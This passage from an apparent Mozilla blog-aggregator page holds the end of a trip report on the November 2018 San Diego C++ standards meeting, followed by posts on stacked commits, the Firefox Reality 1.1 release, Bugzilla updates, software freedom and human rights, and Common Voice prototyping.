<li><code>std::span</code> changes: <a href="http://wg21.link/p1085">not <code>Regular</code></a>, <a href="http://wg21.link/p1024">utility enhancements</a></li>
<li>Merging portions of the Library Fundamentals TS: <a href="http://wg21.link/p0325"><code>to_array()</code></a>, <a href="http://wg21.link/p1083"><code>resource_adaptor</code></a></li>
<li><a href="http://wg21.link/p0645">Text formatting</a></li>
<li>A <a href="http://wg21.link/p0881">stack trace library</a></li>
<li>An <a href="http://wg21.link/p1135">‚Äúomnibus‚Äù synchronization proposal</a> that includes <a href="http://wg21.link/p0541">efficient atomic waiting and semamphores</a>, <a href="http://wg21.link/p0666">latches and barriers</a>, and <a href="http://wg21.link/p0995"><code>atomic_flag::test</code> and lock-free integral types</a>. With this, the only portion of the Concurrency TS v1 that isn‚Äôt headed for C++20 in some form is <code>future.then()</code>, which is still to come (no pun intended).</li>
<li>A <a href="http://wg21.link/p0201">polymorphic value-type</a></li>
<li>A resolution to the debate of whether <code>size()</code> should be <a href="http://wg21.link/p1227r0">signed</a> or <a href="http://wg21.link/p1089">unsigned</a>: it will be unsigned, and a new <code>std::ssize()</code> free function will be added which will return a signed type.</li>
</ul>
<p>And a few notable proposals which are still undergoing design review, and are being treated with priority:</p>
<ul>
<li>More things from the Library Fundamentals TS: <a href="http://wg21.link/p1208"><code>source_location</code></a></li>
<li>Ranges enhancements and integration: <a href="http://wg21.link/p1035">input range adaptors</a>, <a href="http://wg21.link/p1206">range constructors for standard containers and views</a></li>
<li><a href="http://wg21.link/p0798">Monadic operations for <code>std::optional</code></a></li>
<li><a href="http://wg21.link/p0443">Executors</a>, with the ‚Äúproperties API‚Äù portion pulled out into a separate proposal</li>
<li><a href="http://wg21.link/p0586">Safe integral comparisons</a></li>
<li><a href="http://wg21.link/p1222"><code>flat_set</code></a></li>
<li><a href="http://wg21.link/p0660"><code>jthread</code></a> (cooperatively interruptible joining thread)</li>
<li><a href="http://wg21.link/p1072">Optimized initialization for <code>basic_string</code></a> (not <code>vector</code> for now)</li>
</ul>
<p>There are numerous other proposals in both categories above, I‚Äôm just calling out a few that seem particularly noteworthy. Please see <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/">the committee‚Äôs website</a> for a full list of proposals.</p>
<h3><strong>Study Groups</strong></h3>
<h4 id="concurrency"><strong>SG 1 (Concurrency)</strong></h4>
<p>Most of the C++20-track work (<code>jthread</code>, Executors subset, synchronization omnibus paper, memory model fixes) has progressed out of the Concurrency Study Group and is mentioned above.</p>
<p>For Executors, the current plan is to put a <em>subset</em> of the <a href="http://wg21.link/p0443">unified proposal</a> (specifically including ‚Äúone way‚Äù and ‚Äúbulk one way‚Äù executors, but not the other kinds) into C++20, and the rest into C++23; a TS is not planned at this time.</p>
<p>Coroutines-related library additions are not being reviewed yet; they need more bake time, and integration with the next revision of Executors.</p>
<p>SG 1 has opinions on <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#freestanding">freestanding implementations</a>: they feel omitting <code>thread_local</code> from a freestanding implementation is fine, but omitting non-lock-free atomics or thread-safe statics is more controversial.</p>
<h4 id="reflection"><strong>SG 7 (Compile-Time Programming)</strong></h4>
<p>There were two meetings related to compile-time programming this week. The first was an evening session where the committee re-affirmed its preference for constexpr-based metaprogramming as the future of C++ metaprogramming, in preference to template metaprogramming (TMP). (There was some confusion in this regard, as there was a proposal to <a href="http://wg21.link/p0949r0">standardize Boost.Mp11</a>, a TMP library. The feeling at the end of the meeting was that with constexpr metaprogramming just around the corner, it‚Äôs probably not the best use of committee time to standardize a TMP library.)</p>
<p>The second was an afternoon meeting of SG 7, where the main agenda item was reviewing two proposals for reflection based on constexpr metaprogramming: <a href="http://wg21.link/p0953r1"><code>constexpr reflexpr</code></a>, and <a href="http://wg21.link/p1240">scalable reflection in C++</a>. The first is by the authors of the Reflection TS, and tries to carry over the Reflection TS facilities to the land of constexpr in a relatively straightforward way. The second is a variation of this approach that reflects experience gained from experimentation by some implementers. Both proposals also go further than the Reflection TS in functionality, by supporting <em>reification</em>, which involves going from meta-objects obtained via reflection back to the entities they represent.</p>
<p>One notable difference between the two proposals is that the first uses meta-objects of different types to represent different kinds of entities (e.g. <code>meta::variable</code>, <code>meta::function</code>, etc.), whereas the second uses just one type (<code>meta::info</code>) for all meta-objects, and requires using operations on them (e.g. <code>is_variable()</code>) to discriminate. The authors of the second proposal claim this is necessary for compile-time performance to be manageable; however, from an interface point of view the group preferred the different-types approach, and some implementers thought the performance issues could be solved. At the same time, there was agreement that while there should be different types, they should not form an inheritance hierarchy, but rather be type-erased by-value wrappers. In addition, the group felt that errors should be visible in the type system; that is, rather than having meta-objects admit an invalid state, reflection operations that can fail should return something like <code>expected&lt;meta::info&gt;</code> instead.</p>
<p>The target ship vehicle for a constexpr-based reflection facility is not set in stone yet, but people are hopeful for C++23.</p>
<p>In addition, SG 7 approved some <a href="http://wg21.link/p1354r0">guidelines</a> for what kinds of library proposals should require SG 7 review.</p>
<h4 id="hmi"><strong>SG 13 (Human/Machine Interface)</strong></h4>
<p>The <strong>Human/Machine Interface Study Group</strong> (SG 13) deals with proposals for graphics, event handling, and other forms of user interaction.</p>
<p>Its main product so far has been the <a href="http://wg21.link/p0267">2D graphics proposal</a>, which had been making good progress until it lost consensus to move forward at the <a href="https://botondballo.wordpress.com/2018/06/20/trip-report-c-standards-meeting-in-rapperswil-june-2018/">last meeting</a>. As there was still significant interest in this proposal in many user communities (see e.g. <a href="http://wg21.link/p1200r0">this paper</a> arguing strongly for it), the Convenor asked SG 13 to have another look at it, to see if consensus could somehow be re-attained. There wasn‚Äôt extensive technical discussion of the proposal at this meeting, but we did go over some <a href="http://wg21.link/p1225r0">feedback from potential implementers</a>; it was suggested that the author and other interested parties spend some time talking to graphics experts, many of whom are found in the Bay area (though not the ones at Mozilla ‚Äì our graphics folks are mostly in the Toronto office).</p>
<p>The group also discussed the <a href="http://wg21.link/p1008r1"><code>web_view</code></a> proposal, which was positioned as an alternative to rolling our own graphics API. As the proposal effectively involves shipping a web platform implementation as part of the C++ standard library, this proposal has a lot of relevance to Mozilla. As such, I <a href="https://groups.google.com/d/topic/mozilla.dev.platform/HGjLpdUaLsI/discussion">solicited feedback on it</a> on Mozilla‚Äôs platform mailing list, and the feedback was pretty universally that this is not a good fit for the C++ standard library. I relayed this feedback at this meeting; nonetheless, the group as a whole was in favour of continuing to pursue this proposal. In fact, the group felt this and 2D graphics serve different use cases and should both be pursued in parallel. (Admittedly, there‚Äôs some selection bias going on here: people who choose to attend a meeting of SG 13 are naturally likely to be in favour of proposals in this topic area. I‚Äôm curious to see how these proposals will fare in front of a larger voting audience.)</p>
<p>There was also some general discussion of other topics in scope for this group. There are plans for bring forward a proposal for an <strong>audio</strong> API, and there were also ideas thrown around about things like event handling, user input, sensors, and VR.</p>
<h4 id="tooling"><strong>SG 15 (Tooling)</strong></h4>
<p>The <strong>Tooling Study Group</strong> (SG 15) met for an evening session, and numerous papers concerning a variety of topics were presented.</p>
<p>The most pressing topic was how to integrate Modules with build systems. The problem is nicely summarized in <a href="http://wg21.link/p1300r0">this paper</a>, and proposed solutions range from <a href="http://wg21.link/p1184r0">a separate ‚Äúmodule mapper‚Äù component</a> to <a href="http://wg21.link/p1302r0">relying on conventions</a>.</p>
<p>The other major topic was general discussion about where to go in the space of dependency and package management. Ideas presented here include <a href="http://wg21.link/p1177r0">a set of APIs to allow components of a package ecosystem to interface with each other</a> without requiring a particular implementation for any one component, and ideas around <a href="http://wg21.link/p1313r0">package specification</a>.</p>
<p>I don‚Äôt feel like a lot of <em>decisions</em> were made in this session, and the group as a whole seems to be conflicted about what its role is given that these areas are not in the purview of the C++ standards document itself, but I still think the evening served as a valuable opportunity for pioneers in these areas to exchange areas and build mindshare around the tooling problems facing the C++ community.</p>
<h4><strong>Other Study Groups</strong></h4>
<p>Other Study Groups that met at this meeting include:</p>
<ul>
<li><strong>SG 6 (Numerics)</strong>, which met for about a day and a half and reviewed a dozen or so proposals</li>
<li><strong>SG 12 (Undefined and Unspecified Behaviour)</strong>, which met both on its own (largely due discuss Contracts) and in joint session with <a href="http://www.open-std.org/jtc1/sc22/wg23/">WG23 ‚Äì Software Vulnerabilities</a> (where the focus was on vulnerabilities related to control structures)</li>
<li><strong>SG 16 (Unicode)</strong>, for which this was the first in-person meeting. The group approved <a href="http://wg21.link/p1238r0">a set of high-level priorities</a> in addition to reviewing several specific proposals.</li>
</ul>
<h4 id="freestanding"><strong>Freestanding Implementations</strong></h4>
<p>Not a study group, but this didn‚Äôt really fit anywhere else: there was an evening session to try to clarify the committee‚Äôs approach to <strong>freestanding implementations</strong>.</p>
<p>Freestanding implementations are, roughly speaking, those which cannot assume the presence of a full complement of operating system services, because they‚Äôre e.g. targeting kernel code or other ‚Äúbare metal‚Äù scenarios; such implementations cannot practically make use of all language features, such as exceptions.</p>
<p>The standard currently defines a subset of the <em>library</em> that is intended to be supported on freestanding implementations, but defines no such subset for the language. Attempts to define such a subset tend to be stymied by the fact that different environments have different constraints, so one subset does not fit all.</p>
<p>The session didn‚Äôt reach any firm conclusions, but one possible direction is to avoid trying to define subsets, and instead make it easier for target environments to not use features of the language that are not applicable or practical for it.</p>
<h4><strong>New Study Groups</strong></h4>
<p>Two new Study Groups were announced at this meeting. Quoting their charters from <a href="https://herbsutter.com/2018/11/13/trip-report-fall-iso-c-standards-meeting-san-diego/">Herb Sutter‚Äôs trip report</a>:</p>
<p><strong>SG 19 (Machine Learning)</strong>:</p>
<blockquote><p>We feel we can leverage C++‚Äôs strengths in generic programming, optimization and acceleration, as well as code portability, for the specific domain of Machine Learning. The aim of SG19 is to address and improve on C++‚Äôs ability to support fast iteration, better support for array, matrix, linear algebra, in memory passing of data for computation, scaling, and graphing, as well as optimization for graph programming.</p></blockquote>
<p><strong>SG 20 (Education)</strong>:</p>
<blockquote><p>We feel we have an opportunity to improve the quality of C++ education, to help software developers correctly use our language and ecosystem to write correct, maintainable, and performing software. SG20 aims to create curriculum guidelines for various levels of expertise and application domains, and to stimulate WG21 paper writers to include advise on how to teach the new feature they are proposing to add to the standard.</p></blockquote>
<h3><strong>Next Meetings</strong></h3>
<p>The next meeting of the Committee will be in Kona, Hawaii, the week of February 18th, 2019.</p>
<h3><strong>Conclusion</strong></h3>
<p>C++ standards development continues to progress at an unprecedented pace. My highlights for this meeting included:</p>
<ul>
<li>Modules gaining design approval to go into C++20</li>
<li>Abbreviated function templates reaching consensus, to round out Concepts in C++20</li>
<li>Ranges being voted into the C++20 working draft</li>
<li>Coroutines continuing to progress towards a unified design that can hopefully achieve consensus</li>
</ul>
<p>With the big-ticket items above, not to mention Contracts, operator spaceship, and many other goodies, C++20 is shaping up to be a very impressive release!</p>
<p>Due to sheer number of proposals, there is a lot I didn‚Äôt cover in this post; if you‚Äôre curious about a specific proposal that I didn‚Äôt mention, please feel free to ask about it in the comments.</p>
<h3><strong>Other Trip Reports</strong></h3>
<p>In addition to <a href="https://herbsutter.com/2018/11/13/trip-report-fall-iso-c-standards-meeting-san-diego/">Herb‚Äôs</a>, other trip reports about this meeting include <a href="https://cor3ntin.github.io/posts/sandiego/">Corentin Jabot‚Äôs</a>, <a href="https://www.reddit.com/r/cpp/comments/9vwvbz/2018_san_diego_iso_c_committee_trip_report_ranges/">a collaborative Reddit report</a>, and a <a href="http://cppcast.com/2018/11/ashley-hedberg/">podcast focused on Library Evolution</a> by Ashley Hedberg. I encourage you to check them out as well!</p></div></div><div class="permalink"><a href="https://botondballo.wordpress.com/2018/11/30/trip-report-c-standards-meeting-in-san-diego-november-2018/">by botondballo at <time datetime="2018-11-30T15:00:12Z" title="November 30, 2018 03:00 PM GMT">‰∏ãÂçà11:00:12</time></a></div></div><div class="news mark-c√¥t√©" xml:lang="en-ca"><a id="news-64"></a><h3><a href="https://mrcote.info/categories/mozilla/" title="Mozilla on mr mr cote">Mark C√¥t√©</a> ‚Äî <a href="https://mrcote.info/blog/2018/11/30/a-tale-of-two-commits/">A Tale of Two Commits</a></h3><div class="entry"><div class="content">I‚Äôve discussed and linked to articles about the advantages of splitting patches into small pieces to the point that I don‚Äôt feel the need to reiterate it here. This is a common approach at Mozilla, especially (but not just) in Firefox engineering, something the Engineering Workflow group is always keeping in mind when planning changes and improvements to tools and processes.
Many Mozilla engineers have a particular approach to working with small diffs, something, I‚Äôve realized over time, that seems to be pretty uncommon in the industry: the stacking of commits together in a logical series that solves a particular problem or implements a specific feature.</div></div><div class="permalink"><a href="https://mrcote.info/blog/2018/11/30/a-tale-of-two-commits/">by Mark C√¥t√© at <time datetime="2018-11-30T13:58:41Z" title="November 30, 2018 01:58 PM GMT">‰∏ãÂçà9:58:41</time></a></div></div><div class="news mozilla-vr-blog"><a id="news-65"></a><h3><a href="https://blog.mozvr.com/" title="Mozilla Mixed Reality Blog">Mozilla VR Blog</a> ‚Äî <a href="https://blog.mozvr.com/firefox-reality-update-supports-360-videos-and-7-additional-languages/">Firefox Reality update supports 360 videos and 7 additional languages</a></h3><div class="entry"><div class="content"><div class="kg-card-markdown"><img alt="Firefox Reality update supports 360 videos and 7 additional languages" src="banner_vertical_1690-fs8.png" /><p>Firefox Reality 1.1 is now available for download in the Viveport, Oculus, and Daydream app stores. This release includes some major new features, including localization to seven new languages (including voice search support), a new dedicated theater viewing mode, bookmarks, 360 video support, and significant improvements to the performance and quality of our user interface.</p>
<p>We also continue to expand the Firefox Reality content feed, and are excited to add cult director/designer Keiichi Matsuda‚Äôs video series, including his latest creation, <a href="https://www.youtube.com/watch?v=D7bRgE8le-o">Merger</a>.</p>
<p>Keiichi‚Äôs work explores how emerging technologies will impact everyday life in the future. His acclaimed 2016 film HYPER-REALITY was a viral success, presenting a provocative and kaleidoscopic vision of the future city saturated in media. It was an extension and re-imagining of his earlier concept films made in 2010, also presented here. His new short film, Merger, is shot in 360 and explores the future of work, automated corporations and the cult of productivity. We follow an elite tele-operator fighting for her economic survival, in search of the ultimate interface.</p>

<p>New Features:</p>
<ul>
<li>Improved theater mode with 360 video playback support</li>
<li>Additional localization: Chinese (Mandarin - simplified and traditional), French, Italian, German, Spanish, Japanese, Korean</li>
<li>Expanded voice search support to new localized languages above</li>
<li>Bookmarks</li>
<li>Automatic search and domain suggestions in URL bar</li>
</ul>
<p>Improvements/Bug Fixes:</p>
<ul>
<li>Improved 2D UI performance</li>
</ul>
<p>Full release notes can be found in our GitHub repo <a href="https://github.com/MozillaReality/FirefoxReality/wiki/Release-notes-for-version-1.1">here</a>.</p>
<p>Looking ahead, we are exploring content sharing and syncing across browsers (including bookmarks), multiple windows, tab support, as well as continuing to invest in baseline features like performance. We appreciate your ongoing feedback and suggestions ‚Äî please keep it coming!</p>
<h3>Firefox Reality is available right now.</h3>
<p><a href="https://www.oculus.com/experiences/go/2208418715853974/">Download for Oculus</a><br />
(supports Oculus Go)</p>
<p><a href="https://play.google.com/store/apps/details?id=org.mozilla.vrbrowser">Download for Daydream</a><br />
(supports all-in-one devices)</p>
<p>Download for Viveport (Search for ‚ÄúFirefox Reality‚Äù in Viveport store)<br />
(supports all-in-one devices running VIVE Wave)</p>
</div></div></div><div class="permalink"><a href="https://blog.mozvr.com/firefox-reality-update-supports-360-videos-and-7-additional-languages/">by Andre Vrignaud at <time datetime="2018-11-30T05:00:00Z" title="November 30, 2018 05:00 AM GMT">‰∏ãÂçà1:00:00</time></a></div></div><div class="news mozilla-b-team"><a id="news-66"></a><h3><a href="https://mozilla-bteam.tumblr.com/" title="Mozilla B-Team">Mozilla B-Team</a> ‚Äî <a href="https://mozilla-bteam.tumblr.com/post/180639137698">happy bmo push day!</a></h3><div class="entry"><div class="content"><p><a href="http://dylan.hardison.net/2018/11/29/happy-bmo-push-day-18/">happy bmo push¬†day!</a></p><blockquote><p>We did another release today.</p>
<p><a href="https://github.com/mozilla-bteam/bmo/tree/release-20181129.2">release tag</a></p>
<p>the following changes have been pushed to bugzilla.mozilla.org:</p>
<ul><li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1510427">1510427</a>] improve fulltext completion for real names</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1508261">1508261</a>] Closing DevRel sponsorship form on Bugzilla and updating Wiki page</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1508385">1508385</a>] Remove links to input.mozilla.org from Guided Bug Entry flow</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1510653">1510653</a>] API method for returning users profile information when given a valid oauth2‚Ä¶</li>
</ul></blockquote><p><a href="http://dylan.hardison.net/2018/11/29/happy-bmo-push-day-18/">View On WordPress</a></p></div></div><div class="permalink"><a href="https://mozilla-bteam.tumblr.com/post/180639137698">by dylanwh at <time datetime="2018-11-30T02:52:22Z" title="November 30, 2018 02:52 AM GMT">‰∏äÂçà10:52:22</time></a></div></div><div class="news daniel-pocock" xml:lang="en"><a id="news-67"></a><h3><a href="https://danielpocock.com/tags/mozilla" title="DanielPocock.com - mozilla">Daniel Pocock</a> ‚Äî <a href="https://danielpocock.com/connecting-free-software-and-human-rights">Connecting software freedom and human rights</a></h3><div class="entry"><div class="content"><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even"><p>2018 is the <a href="http://www.standup4humanrights.org/en/index.html">70th anniversary of the Universal Declaration of Human Rights</a>.</p>
<p><img src="2018-11-un-forum-pic1.png" width="800" /></p>
<p>Over the last few days, while <a href="https://danielpocock.com/un-forum-business-human-rights-2018">attending the UN Forum on Business and Human Rights</a>, I've had various discussions with people about the relationship between software freedom, business and human rights.</p>
<p>In the information age, control of the software, source code and data translates into power and may contribute to inequality.  <a href="https://www.gnu.org/philosophy/free-sw.en.html">Free software principles</a> are not simply about the cost of the software, they lead to transparency and give people infinitely more choices.</p>
<p>Many people in the free software community have taken a particular interest in privacy, which is Article 12 in the declaration.  The modern Internet challenges this right, while projects like <a href="https://tails.boum.org/">TAILS</a> and <a href="https://www.torproject.org/">Tor Browser</a> help to protect it.  The UN's 70th anniversary slogan <em>Stand up 4 human rights</em> is a call to help those around us understand these problems and make effective use of the solutions.</p>
<p>We live in a time when human rights face serious challenges.  Consider censorship: Saudi Arabia is accused of complicity in the disappearance of columnist <a href="https://en.wikipedia.org/wiki/Jamal_Khashoggi">Jamal Khashoggi</a> and the White House is accused of using <a href="https://edition.cnn.com/2018/07/26/opinions/kaitlan-collins-cnn-reporter-banned-press-united-cupp-opinion/index.html">fake allegations to try and banish CNN journalist Jim Acosta</a>.  Arjen Kamphuis, co-author of <a href="https://tcij.org/sites/default/files/u11/InfoSec%20for%20Journalists%20V1.3.pdf">Information Security for Journalists</a>, <a href="https://www.theguardian.com/media/2018/sep/14/speculation-over-fate-of-missing-dutchman-linked-to-wikileaks">vanished in mysterious circumstances</a>.  The last time I saw Arjen was at <a href="https://oscal.openlabs.cc/">OSCAL'18 in Tirana</a>.</p>
<p>For many of us, events like these may leave us feeling powerless.  Nothing could be further from the truth.  <em>Standing up for human rights</em> starts with looking at our own failures, both as individuals and organizations.  For example, have we ever taken offense at something, judged somebody or rushed to make accusations without taking time to check facts and consider all sides of the story?  Have we seen somebody we know treated unfairly and remained silent?  Sometimes it may be desirable to speak out publicly, sometimes a difficult situation can be resolved by speaking to the person directly or having a meeting with them.</p>
<p>Being at the United Nations provided an acute reminder of these principles.  In parallel to the event, the UN were hosting a conference on the <a href="http://www.icbl.org/en-gb/the-treaty/treaty-meetings/meetings-of-states-parties/17msp.aspx">mine ban treaty</a> and the <a href="https://www.reuters.com/article/us-afghanistan-politics-economy-idUSKCN1NW1K3">conference on Afghanistan</a>, the Afghan president arriving as I walked up the corridor.  These events reflect a legacy of hostilities and sincere efforts to come back from the brink.</p>
<p><img src="afghan-president.jpg" width="800" /></p>
<h3>A wide range of discussions and meetings</h3>
<p>There were many opportunities to have discussions with people from all the groups present.  Several sessions raised issues that made me reflect on the relationship between corporations and the free software community and the risks for volunteers.  At the end of the forum I had a brief discussion with Dante Pesce, Chair of the UN's Business and Human Rights working group.</p>
<p><img src="2018-dante-pesce.jpg" width="800" /></p>
<h3>Best free software resources for human rights?</h3>
<p>Many people at the forum asked me how to get started with free software and I promised to keep adding to my blog.  What would you regard as the best online resources, including videos and guides, for people with an interest in human rights to get started with free software, solving problems with privacy and equality?  Please <a href="https://lists.gnu.org/mailman/listinfo/libreplanet-discuss">share them on the Libre Planet mailing list</a>.</p>
<h3>Let's not forget animal rights too</h3>
<p>Are dogs entitled to danger pay when protecting heads of state?</p>
<p><img src="2018-un-dog.jpg" width="640" /></p>
</div></div></div></div></div><div class="permalink"><a href="https://danielpocock.com/connecting-free-software-and-human-rights">by Daniel.Pocock at <time datetime="2018-11-29T22:04:15Z" title="November 29, 2018 10:04 PM GMT">‰∏äÂçà6:04:15</time></a></div></div><div class="news the-firefox-frontier" xml:lang="en-US"><a id="news-68"></a><h3><a href="https://blog.mozilla.org/firefox" title="The Firefox Frontier">The Firefox Frontier</a> ‚Äî <a href="https://blog.mozilla.org/firefox/firefox-reality-oculus-go-vr/">How to Use Firefox Reality on the Oculus Go VR Headset</a></h3><div class="entry"><div class="content"><p>Virtual reality headsets are one of the hottest gifts of the season, but without an internet browser built for virtual reality the experience could fall flat. Enter, Firefox Reality, an ‚Ä¶ <a class="go" href="https://blog.mozilla.org/firefox/firefox-reality-oculus-go-vr/">Read more</a></p>
<p>The post <a href="https://blog.mozilla.org/firefox/firefox-reality-oculus-go-vr/" rel="nofollow">How to Use Firefox Reality on the Oculus Go VR Headset</a> appeared first on <a href="https://blog.mozilla.org/firefox" rel="nofollow">The Firefox Frontier</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/firefox/firefox-reality-oculus-go-vr/">by The Firefox Frontier at <time datetime="2018-11-29T19:47:53Z" title="November 29, 2018 07:47 PM GMT">‰∏äÂçà3:47:53</time></a></div></div><div class="news mozilla-b-team"><a id="news-69"></a><h3><a href="https://mozilla-bteam.tumblr.com/" title="Mozilla B-Team">Mozilla B-Team</a> ‚Äî <a href="https://mozilla-bteam.tumblr.com/post/180622734648">happy bmo push days</a></h3><div class="entry"><div class="content"><p><a href="http://dylan.hardison.net/2018/11/29/happy-bmo-push-days/">a whole bunch of updates (including last week‚Äôs)</a></p><blockquote><p>Last week‚Äôs pushes didn‚Äôt get posted because we had a few bug fixes, so below is yesterday‚Äôs push + last weeks, in reverse chronological order.</p>
<p><a href="https://github.com/mozilla-bteam/bmo/tree/release-20181127.1">release tag</a></p>
<p>the following changes have been pushed to bugzilla.mozilla.org:</p>
<ul><li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1484892">1484892</a>] Modify EditComments extension to let anyone use it conditionally and support inline editing</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1354589">1354589</a>] Implement OAuth2 on BMO</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1452018">1452018</a>] Remove remaining Firefox OS and‚Ä¶</li>
</ul></blockquote><p><a href="http://dylan.hardison.net/2018/11/29/happy-bmo-push-days/">View On WordPress</a></p></div></div><div class="permalink"><a href="https://mozilla-bteam.tumblr.com/post/180622734648">by dylanwh at <time datetime="2018-11-29T16:44:34Z" title="November 29, 2018 04:44 PM GMT">‰∏äÂçà12:44:34</time></a></div></div><h2><time datetime="2018-11-29">Thursday, 29 November 2018</time></h2><div class="news mozilla-open-innovation-team"><a id="news-70"></a><h3><a href="https://medium.com/mozilla-open-innovation?source=rss----410b8dc3986d---4" title="Mozilla Open Innovation - Medium">Mozilla Open Innovation Team</a> ‚Äî <a href="https://medium.com/mozilla-open-innovation/prototyping-with-intention-33d15fb147c2?source=rss----410b8dc3986d---4">Prototyping with Intention</a></h3><div class="entry"><div class="content"><p>In our <a href="https://medium.com/mozilla-open-innovation/were-intentionally-designing-open-experiences-here-s-why-c6ae9730de54">first post</a> of this series we introduced why, and a bit of how, we‚Äôre applying experience design to our Open Innovation projects and community collaboration. An integral part of experience design is growing an idea from a concept to a full-fledged product or service. In getting from one to the other, thinking and acting prototypically can make a significant difference in overall quality and sets us up for early, consistent feedback. We are then able to continually identify new questions and test our hypotheses with incremental work. So, what do we actually mean by <em>thinking and acting prototypically</em>?</p><figure><img alt="" src="1+fprb_m0zwvh83ip5zxevnw.gif" />&lt;figcaption&gt;<a href="https://voice.mozilla.org/">Common Voice</a> started as a proof of concept prototype and has been collaboratively iterated over the past¬†year&lt;/figcaption&gt;</figure><h4>Be Open to¬†Change</h4><p>At the start of any project our Open Innovation team concepts with the intention that things will change. Whether it be <a href="http://bit.ly/IAM-lock-wireframe">wireframe prototypes</a> or <a href="https://mozilla.github.io/diversity-coc-review.io/">coded experiments</a>, iteration is inevitable. First ideas are often far from perfect‚Ä¶ it‚Äôs with help from new or returning contributors and <a href="https://github.com/mozilla/deepspeech">collaborating project teams</a> that we‚Äôre able to refine initial ideas more readily and efficiently. How? Through feedback loops designed with tools such as <a href="https://discourse.mozilla.org/">Discourse</a>, <a href="https://github.com/mozilla/voice-web">GitHub</a>, contact forms, on-site surveys and <a href="https://www.usertesting.com/">remote testing</a>. Our overall goal being: Release assumptions early and learn from those engaging with the concept. In this way we set our experiences up for incremental, data influenced iteration.</p><figure><img alt="" src="1+xcw29ybogbglqrrue2v6iw.png" />&lt;figcaption&gt;<em>Workshop paper prototypes became coded production prototypes over a 6 week¬†stretch</em>&lt;/figcaption&gt;</figure><p>To continue with our example of <a href="https://voice.mozilla.org/">Common Voice</a>, we see that this approach was applied in moving from paper prototype to first production prototype. The learnings and feedback from the design sprint exercises helped us realize the need for storytelling and a human interaction experience that would resonate with, well, humans. To achieve this we set out over a 6 week phase to create the experience via wireframes, <a href="https://mozilla.github.io/voice-web/docs/specs/index.html#artboard6">basic UI design</a> and code implementation. With the help of our community members we were gratefully able to <a href="https://github.com/mozilla/voice-web/issues/241">QA the experience</a> as we released¬†it.</p><h4>Iterate Consistently and Incrementally</h4><p>With a working prototype out in the wild our team sets their focus on observing and gathering info about performance and usability. In addition to <a href="https://github.com/mozilla/voice-web/graphs/contributors">250+ technical contributors</a> that file issues with feature requests and bug fixes, for Common Voice, our team made time to evaluate the prototype from a usability perspective.</p><figure><img alt="" src="1+kjv5ez-omlwrjdq4grzfuw.png" />&lt;figcaption&gt;The Common Voice GitHub repository is a hub of collaboration between contributors and Mozilla¬†staff&lt;/figcaption&gt;</figure><p>About three months in we performed a UX assessment reviewing initial prototype designs against what actually made it to production code. Comparing this against feature requests from product stakeholders and contributors, our experience design goal was to understand changes most needed to improve usability and engagement across the¬†site.</p><p>This assessment information, combined with usability testing, supported decisions for improvements such¬†as:</p><ol><li>Adding keyboard shortcuts to the contribution experience</li><li>Improving prompts and progress counters when recording and listening to sentences</li><li>Site navigation layout from sidebar to top¬†header</li><li>Optimization for responsiveness across viewports</li><li>Providing clear calls to action for contribution on the¬†homepage</li></ol><figure><img alt="" src="1+ript3we3fr_hkcwtr1sa_a.png" />&lt;figcaption&gt;The next iteration of the MVP prototype based on usability feedback and contributor feature¬†requests&lt;/figcaption&gt;</figure><h3>Workshop New Questions</h3><p>Completing the incremental work allows us to find our way to new questions and needs as a product or service evolves. Along with the feature requests and smaller production needs required of a live prototype, there are larger project strategy queries that can come to light. These are the types of queries you can only learn from experimenting.</p><p>Releasing our <a href="https://medium.com/mozilla-open-innovation/sharing-our-common-voice-mozilla-releases-second-largest-public-voice-data-set-e88f7d6b7666">first dataset</a> for Common Voice was the result of one such experiment. An achievement in itself, it also proved that our concept had merit. The prototype was working! Despite this, in equal measure it also highlighted quality gaps in our data: it could be more spontaneous, such as two humans naturally conversing would allow. It also reaffirmed something we already knew: our data could be far more diverse. Meaning more gender, accent, dialect and overall language diversity. There is an increasing need for a large, publicly open multi-language voice dataset. This has been clear from the start of this project. True to our desire to <em>think and act prototypically</em> we had to choose a single language to focus resources and first prove out the concept. With the successful release of the first dataset we were ready to take on some new questions and keep iterating:</p><ol><li>How might we enable a multi-language experience?</li><li>How might we increase the quantity and quality of our contributions?</li></ol><p>Having already gained integral insights for Common Voice via an experience workshop, we planned another. In January of 2018 we brought together commercial and academic partners to join Mozilla team members, including various expert influencers, to help brainstorm and ideate potential solutions for these questions. The common interest of the attendees? <em>Seeing this unique project succeed.</em> Many had come up against these types of questions in different contexts across their work and were keen to ideate on ways to improve the¬†site.</p><figure><img alt="" src="1+uw9vbgn4dpssjyg66gxn5w.png" />&lt;figcaption&gt;Multi-language experience wireframes result from a collaborative experience journey and feature prioritization&lt;/figcaption&gt;</figure><p>Workshopping the first question meant determining requirements (<em>what does success look like</em>) and mapping experience journeys to achieve those requirements (<em>see the above image</em>). What resulted was this realization: we have big, multi-feature dreams for the overall Common Voice multi-language experience. To make those dreams a reality we first focused on what was most needed first, providing people a way to contribute in their desired language(s). Other features, like building dedicated language pages and creating a community dashboard, are built into our roadmap. This feature prioritization enabled us to deliver a <a href="https://voice.mozilla.org/en/languages">multi-language experience</a> in May of this year. Reaching this milestone has made the second Common Voice dataset release‚Ää‚Äî‚Ääwhich will be our first multi-language dataset release‚Ää‚Äî‚Ääachievable by the end of¬†2018.</p><figure><img alt="" src="1+biv38mwfpm_3ia_hs0x7ia.jpeg" />&lt;figcaption&gt;Workshop session on how we might increase the quantity and quality of voice contributions for Common¬†Voice&lt;/figcaption&gt;</figure><p>In the area of increasing quantity and quality of contributions, the workshop introduced concepts for improving spontaneous speech capture through potential, future experiments. Some examples include enabling spontaneous, conversational style recording sessions on the website; integrations with existing wearables for set session lengths; and a roaming event pop-up with recording booths. This ideation session even lingered in our minds well past the workshop and has prompted thoughts around an opt-in style recording space in collaboration with <a href="http://hubs.mozilla.com/">Hubs</a>, a virtual spaces experiment by Mozilla‚Äôs <a href="https://blog.mozvr.com/">Mixed 